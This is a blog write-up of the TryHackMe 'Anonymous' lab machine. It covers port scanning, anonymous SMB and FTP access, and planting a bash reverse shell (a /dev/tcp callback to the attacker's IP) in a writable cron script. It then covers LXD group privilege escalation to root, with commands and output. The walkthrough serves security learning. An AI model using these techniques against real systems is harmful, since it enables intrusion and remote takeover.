<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> Writeup - THM - Anonymous -Phil Malle </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Walkthrough of Anonymous of TryHackme.- Writeup - THM - Anonymous"> <meta name="keywords" content="Writeup - THM - Anonymous, Phil Malle, walkthroughs,TryHackeMe, Anonymous, Hacking, pwned"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="Phil Malle" property="og:site_name" /> <meta content="Writeup - THM - Anonymous" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Walkthrough of Anonymous of TryHackme." property="og:description" /> <meta content="/blog/anonymous/" property="og:url" /> <meta content="2020-09-27T23:14:00+00:00" property="article:published_time" /> <meta content="/about/" property="article:author" /> <meta content="/assets/img/thm-images/THM-BountyHacker.png" property="og:image" /> <meta content="walkthroughs" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="Writeup - THM - Anonymous" /> <meta name="twitter:url" content="/blog/anonymous/" /> <meta name="twitter:description" content="Walkthrough of Anonymous of TryHackme." /> <link rel="stylesheet" href="/assets/css/main.css" /> <!-- <link rel="stylesheet" href="/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = '' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="/assets/js/search.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!-- (you can remove the below scripts but do buy me a coffee to show some support :) --> <!-- buy me a coffeee --> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="philmalle" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">Phil Malle</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="/about" >About Me</a > </li> <li class="nav-item"> <a class="nav-link" href="/gallery" >Achievements</a > </li> <li class="nav-item"> <a class="nav-link" href="/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="/contact" >Contact</a > </li> <li class="nav-item"> <a class="nav-link" href="/links" >Links</a > </li> <li class="nav-item"> <a class="nav-link" href="/pgp" >GNUPG-Public Key</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher() " type="checkbox" name="checkbox" /> </li> </ul> </nav> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">Writeup - THM - Anonymous</h1> <h4 class="post-meta">Walkthrough of Anonymous of TryHackme.</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="/blog/authors/fr3akazo1d">fr3akazo1d</a></span> </span > at <time datetime="2020-09-27 23:14:00 +0000" itemprop="datePublished" >Sep 27, 2020</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/anonymous/" ></span> <div class="post-categories"> Category : <a href="/blog/categories/walkthroughs" >walkthroughs</a > </div> </div> <div class="card-body" itemprop="articleBody"> <center> <img src="/assets/img/thm-images/THM-BountyHacker.png" alt="" /></center> <br /> <br /> <h1 id="general-information">General Information</h1> <table> <thead> <tr> <th>Room</th> <th>Date</th> <th>Difficulty</th> <th>Tags</th> <th>Time</th> </tr> </thead> <tbody> <tr> <td>Anonymous</td> <td>27.09.2020</td> <td>Medium</td> <td>Security, linux, permissions, medium</td> <td>2h</td> </tr> </tbody> </table> <h1 id="used-programs">Used Programs</h1> <table> <thead> <tr> <th>Program</th> <th>Command</th> </tr> </thead> <tbody> <tr> <td>rustscan</td> <td>rustscan $ip –ulimit 5000 – -sC -sV -oN nmap/initial tee output</td> </tr> <tr> <td>smbclient</td> <td>smbclient -L 10.10.195.20</td> </tr> <tr> <td>ftp</td> <td>ftp 10.10.195.20</td> </tr> </tbody> </table> <h1 id="tryhackme---answers">TryHackMe - Answers:</h1> <hr /> <h2 id="1-enumerate-the-machine-how-many-ports-are-open">1 Enumerate the machine. How many ports are open?</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4
</code></pre></div></div> <h2 id="2-what-service-is-running-on-port-21">2 What service is running on port 21?</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp
</code></pre></div></div> <h2 id="3-what-service-is-running-on-ports-139-and-445">3 What service is running on ports 139 and 445?</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb
</code></pre></div></div> <h2 id="4-theres-a-share-on-the-users-computer-whats-it-called">4 There’s a share on the user’s computer. What’s it called?</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pics
</code></pre></div></div> <h2 id="5-usertxt">5 user.txt</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>9******************************0
</code></pre></div></div> <h2 id="6-roottxt">6 root.txt</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>4******************************3
</code></pre></div></div> <hr /> <h1 id="walkthrough">Walkthrough:</h1> <p>The first thing i always do is a NMAP-Scan on the target machine. I used the Program “Rustscan”.</p> <p>The rustscan command which i used was:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rustscan 10.10.195.20 | <span class="nb">tee </span>rustscan-output.txt
</code></pre></div></div> <p>Below the output of the Rustscan.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>File: rustscan-output.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
   2   │ | <span class="o">{}</span>  <span class="o">}</span>| <span class="o">{</span> <span class="o">}</span> |<span class="o">{</span> <span class="o">{</span>__ <span class="o">{</span>_   _<span class="o">}{</span> <span class="o">{</span>__  /  ___<span class="o">}</span> / <span class="o">{}</span> <span class="se">\ </span>|  <span class="sb">`</span>| |
   3   │ | .-. <span class="se">\|</span> <span class="o">{</span>_<span class="o">}</span> |.-._<span class="o">}</span> <span class="o">}</span> | |  .-._<span class="o">}</span> <span class="o">}</span><span class="se">\ </span>    <span class="o">}</span>/  /<span class="se">\ </span> <span class="se">\|</span> |<span class="se">\ </span> |
   4   │ <span class="sb">`</span>-<span class="s1">' `-'</span><span class="sb">`</span><span class="nt">-----</span><span class="s1">'`----'</span>  <span class="sb">`</span>-<span class="s1">'  `----'</span>  <span class="sb">`</span><span class="nt">---</span><span class="s1">' `-'</span>  <span class="sb">`</span>-<span class="s1">'`-'</span> <span class="sb">`</span>-<span class="s1">'
   5   │ Faster Nmap scanning with Rust.
   6   │ ________________________________________
   7   │ : https://discord.gg/GFrQsGy           :
   8   │ : https://github.com/RustScan/RustScan :
   9   │  --------------------------------------
  10   │ 🌍HACK THE PLANET🌍
  11   │ 
  12   │ [~] The config file is expected to be at "/home/fr3akazo1d/.rustscan.toml"
  13   │ [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive s
       │ ervers
  14   │ [!] Your file limit is very small, which negatively impacts RustScan'</span>s speed. Use the Docker image, or up the
       │  Ulimit with <span class="s1">'--ulimit 5000'</span><span class="nb">.</span> 
  15   │ Open 10.10.195.20:21
  16   │ Open 10.10.195.20:139
  17   │ Open 10.10.195.20:22
  18   │ Open 10.10.195.20:445
  19   │ <span class="o">[</span>~] Starting Nmap
  20   │ <span class="o">[&gt;]</span> The Nmap <span class="nb">command </span>to be run is nmap <span class="nt">-vvv</span> <span class="nt">-p</span> 21,139,22,445 10.10.195.20
  21   │ 
  22   │ Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-27 21:18 CEST
  23   │ Initiating Ping Scan at 21:18
  24   │ Scanning 10.10.195.20 <span class="o">[</span>2 ports]
  25   │ Completed Ping Scan at 21:18, 0.08s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
  26   │ Initiating Parallel DNS resolution of 1 host. at 21:18
  27   │ Completed Parallel DNS resolution of 1 host. at 21:18, 0.03s elapsed
  28   │ DNS resolution of 1 IPs took 0.03s. Mode: Async <span class="o">[</span><span class="c">#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
  29   │ Initiating Connect Scan at 21:18
  30   │ Scanning 10.10.195.20 <span class="o">[</span>4 ports]
  31   │ Discovered open port 139/tcp on 10.10.195.20
  32   │ Discovered open port 445/tcp on 10.10.195.20
  33   │ Discovered open port 22/tcp on 10.10.195.20
  34   │ Discovered open port 21/tcp on 10.10.195.20
  35   │ Completed Connect Scan at 21:18, 0.07s elapsed <span class="o">(</span>4 total ports<span class="o">)</span>
  36   │ Nmap scan report <span class="k">for </span>10.10.195.20
  37   │ Host is up, received conn-refused <span class="o">(</span>0.080s latency<span class="o">)</span><span class="nb">.</span>
  38   │ Scanned at 2020-09-27 21:18:25 CEST <span class="k">for </span>0s
  39   │ 
  40   │ PORT    STATE SERVICE      REASON
  41   │ 21/tcp  open  ftp          syn-ack
  42   │ 22/tcp  open  ssh          syn-ack
  43   │ 139/tcp open  netbios-ssn  syn-ack
  44   │ 445/tcp open  microsoft-ds syn-ack
  45   │ 
  46   │ Read data files from: /usr/bin/../share/nmap
  47   │ Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.22 seconds
</code></pre></div></div> <p>As in the output we can see, that we have 4 Ports open:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  40   │ PORT    STATE SERVICE      REASON
  41   │ 21/tcp  open  ftp          syn-ack
  42   │ 22/tcp  open  ssh          syn-ack
  43   │ 139/tcp open  netbios-ssn  syn-ack
  44   │ 445/tcp open  microsoft-ds syn-ack
</code></pre></div></div> <h2 id="enumerate-smb-share">Enumerate SMB-Share</h2> <p>The first Port i have explored was 139/445 SMB. With the command “smbclient -L 10.10.195.20” we enummerate the services witch a available on the server.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-L|--list
This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.
</code></pre></div></div> <p>This give us this Infromation:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> 10.10.195.20
Enter WORKGROUP<span class="se">\f</span>r3akazo1d<span class="s1">'s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
</span></code></pre></div></div> <p>With this infromation, i tried to connect to the “pics” share on the server.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>10.10.195.20<span class="se">\\</span>pics
Enter WORKGROUP<span class="se">\f</span>r3akazo1d<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun May 17 13:11:34 2020
  ..                                  D        0  Sun Sep 27 21:48:54 2020
  corgo2.jpg                          N    42663  Tue May 12 02:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 02:43:42 2020

		20508240 blocks of size 1024. 13289716 blocks available
smb: \&gt;
copied the files to my local machine:

smb: \&gt; get corog2.jpg
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \corog2.jpg
smb: \&gt; get corgo2.jpg
getting file \corgo2.jpg of size 42663 as corgo2.jpg (94.9 KiloBytes/sec) (average 94.9 KiloBytes/sec)
smb: \&gt; get puppos.jpeg
getting file \puppos.jpeg of size 265188 as puppos.jpeg (315.1 KiloBytes/sec) (average 238.4 KiloBytes/sec)
smb: \&gt; 
</span></code></pre></div></div> <p>This connection was successfully. The connection was done without any password and username. Analyzed the two files with steghide. there are some files behind. but i don’t get the passphrase for the files. These are only pictures of dogs…</p> <h2 id="enumerate-ftp-share">Enumerate FTP-Share</h2> <p>The next step was to enumerate the FTP-Share. Maybe we have better luck on this Server.</p> <p>I tried the “anonymous” login on the FTP-Share.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.195.20
Connected to 10.10.195.20.
220 NamelessOne<span class="s1">'s FTP Server!
Name (10.10.195.20:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
lets check what is on this ftp share:

ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
tp&gt; cd scripts
250 Directory successfully changed.
ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          364 Sep 27 19:39 clean.sh
-rw-rw-r--    1 1000     1000         4257 Sep 27 20:24 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
</span></code></pre></div></div> <p>Anonymous login was successfully so i have checked the files on the FTP-Share. In the folder “scripts” there are three files listed.</p> <ol> <li>clean.sh</li> <li>removed_files.log</li> <li>to_do.txt</li> </ol> <p>Lets check out what is in this files:</p> <p>clean.sh</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat clean.sh         
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clean.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <span class="c">#!/bin/bash</span>
   2   │ 
   3   │ <span class="nv">tmp_files</span><span class="o">=</span>0
   4   │ <span class="nb">echo</span> <span class="nv">$tmp_files</span>
   5   │ <span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
   6   │ <span class="k">then
   </span>7   │         <span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
   9   │ <span class="k">else
  </span>10   │     <span class="k">for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
  </span>11   │         <span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files
       │ .log<span class="p">;</span><span class="k">done
  </span>12   │ <span class="k">fi</span>
</code></pre></div></div> <p>So this file is interessting because, this is somehow removing some files on the target machine. Maybe we can change the code in the file an rerun the scirpt on the target.</p> <p>removed_files.log</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat removed_files.log 
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: removed_files.log
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Running cleanup script:  nothing to delete
   2   │ Running cleanup script:  nothing to delete
   3   │ Running cleanup script:  nothing to delete
   4   │ Running cleanup script:  nothing to delete
   5   │ Running cleanup script:  nothing to delete
   6   │ Running cleanup script:  nothing to delete
   7   │ Running cleanup script:  nothing to delete
   8   │ Running cleanup script:  nothing to delete
   9   │ Running cleanup script:  nothing to delete
   ....
</code></pre></div></div> <p>This is only a log file, when some files are removed it will stored in this file.</p> <p>to_do.txt</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat to_do.txt        
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: to_do.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ I really need to disable the anonymous login...it<span class="s1">'s really not safe
</span></code></pre></div></div> <p>Ok, yes, the anonymous login should be removed from the FTP-Server. Something bad can happend. :)</p> <p>Now lets focus on the “clean.sh” Maybe we can add a reverse shell in the bash script. We cann add a bash reverse-shell into the file.</p> <p>Found on Pentest-Monkey a reverse-shell witch should work:</p> <p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" title="Reverse-Shell">Reverse Shell Cheat Sheet</a></p> <p>Added the code in line 8 of the “clean.sh” script. Change the IP-Address to my local address and a port.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat clean.sh         
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: clean.sh
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <span class="c">#!/bin/bash</span>
   2   │ 
   3   │ <span class="nv">tmp_files</span><span class="o">=</span>0
   4   │ <span class="nb">echo</span> <span class="nv">$tmp_files</span>
   5   │ <span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
   6   │ <span class="k">then
   </span>7   │         <span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
   8   │         bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/1<span class="k">*</span>.1<span class="k">*</span>.3.1<span class="k">**</span>/8080 0&gt;&amp;1
   9   │ <span class="k">else
  </span>10   │     <span class="k">for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
  </span>11   │         <span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files
       │ .log<span class="p">;</span><span class="k">done
  </span>12   │ <span class="k">fi</span>
</code></pre></div></div> <p>In another terminal i started a Netcat Listener on port 8080: “nc -lnvp 8080”</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
</code></pre></div></div> <p>and after a few seconds i got a shell on the target:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
connect to <span class="o">[</span>10.11.3.139] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.195.20] 53182
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>2584<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
namelessone@anonymous:~<span class="err">$</span>
</code></pre></div></div> <p>In this shell we can now read the User-flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namelessone@anonymous:~<span class="nv">$ </span><span class="nb">ls
ls
</span>pics
user.txt
namelessone@anonymous:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
9<span class="k">******************************</span>0
</code></pre></div></div> <p>So half way done on the target. Now we want root access on the client. :)</p> <h2 id="privilage-escalation">Privilage-Escalation</h2> <p>For my Privilage-Escalation i exploit the LXD-Vulnerability on the target.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namelessone@anonymous:~<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>namelessone<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>namelessone<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>namelessone<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>lxd<span class="o">)</span>
</code></pre></div></div> <p>The command “id” shows me that the user is in the LXD-Group. LXD is a container software manager. Its like Doker.</p> <p>There is a Vulnerability of the LXD-Container:</p> <p><a href="https://www.exploit-db.com/exploits/46978">Exploit-DB-LXD-Vulnerability</a></p> <p>For the Exploitation i followed the steps in the Command section of the file:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Step 1: Download build-alpine =&gt; wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]</span>
<span class="c"># Step 2: Build alpine =&gt; bash build-alpine (as root user) [Attacker Machine]</span>
<span class="c"># Step 3: Run this script and you will get root [Victim Machine]</span>
<span class="c"># Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine</span>
</code></pre></div></div> <p>When this steps are done we can now run the script on the target:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>namelessone@anonymous:~<span class="nv">$ </span>./get-root.sh <span class="nt">-f</span> alpine-v3.12-x86_64-20200927_2146.tar.gz
&lt;root.sh <span class="nt">-f</span> alpine-v3.12-x86_64-20200927_2146.tar.gz
Image imported with fingerprint: e35751259917ef3b79e8aac7a30a93178e6da525f5b4cf76bef49452d5d09997
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| alpine | e35751259917 | no     | alpine v3.12 <span class="o">(</span>20200927_21:46<span class="o">)</span> | x86_64 | 3.05MB | Sep 27, 2020 at 8:40pm <span class="o">(</span>UTC<span class="o">)</span> |
+--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
Creating privesc
Device giveMeRoot added to privesc
</code></pre></div></div> <p>Let’s check if we are root with the command “id”:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div> <p>In this Vulnerability. The Exploit is loading a Container and is mounting the /root folder to the mounting path “/mnt/root/”.</p> <p>In this path we can now check the root-flag of the target.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /mnt/root/root
<span class="nb">pwd</span>
/mnt/root/root
<span class="nb">ls
</span>root.txt
<span class="nb">cat </span>root.txt
4<span class="k">******************************</span>3
</code></pre></div></div> <p>Now we have the root-flag and we have pwned the machine.</p> <h1 id="summary">Summary:</h1> <p>This room was interessting, because of the change of the script witch is running on the target for getting a reverse shell.</p> <p>When i got the first shell on the target, the Priv-Escalation was straight forward. With LXD it was no new stuff.</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="/blog/anonymous/" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About Fr3akazo1d! </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="/assets/img/authors/freakazoid.png" alt="Fr3akazo1d!" /> </div> <div class="col-md-6"> <p class="author_bio">Cyber-Security Entusiast, CTF-Player</p> <p>Email : fr3akazo1d@protonmail.com</p> <p>Website : https://fr3akazo1d.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/fr3akazo1d" target="_blank"><i class="fab fa-github fa-fw"></i></a> </p> </div> </div> </div> </div> </div> <!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <script> var disqus_config = function () { this.page.url = "/blog/anonymous/"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/thm-Anonymous-Writeup"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */ }; (function () { /* DON'T EDIT BELOW THIS LINE */ var d = document, s = d.createElement('script'); s.src = 'https://.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a> </noscript></div> </div> <div class="row"> <div class="col-md-4"> <div class="card"> <div class="card-header">About Phil Malle</div> <div class="card-body"> <p class="author_bio">Hi, my name is Phil Malle. This is my personal blog about technologies, Cyber-Security and other similar topics.</p><a class="github-button" href="https://github.com/PhilMalle/philmalle.github.io" data-color-scheme="no-preference: dark; light: dark; dark: dark;" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star PhilMalle/philmalle.github.io on GitHub">Star</a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Categories</div> <div class="card-body text-dark"> <div id="#walkthroughs"></div> <li class="tag-head"> <a href="/blog/categories/walkthroughs">walkthroughs</a> </li> <a name="walkthroughs"></a> <div id="#journey"></div> <li class="tag-head"> <a href="/blog/categories/journey">journey</a> </li> <a name="journey"></a> </div> </div> </div> <div class="col-md-4"> <div class="card"> <div class="card-header">Useful Links</div> <div class="card-body text-dark"> <li> <a href="/about">About Me</a> </li> <li> <a href="/gallery">Achievements</a> </li> <li> <a 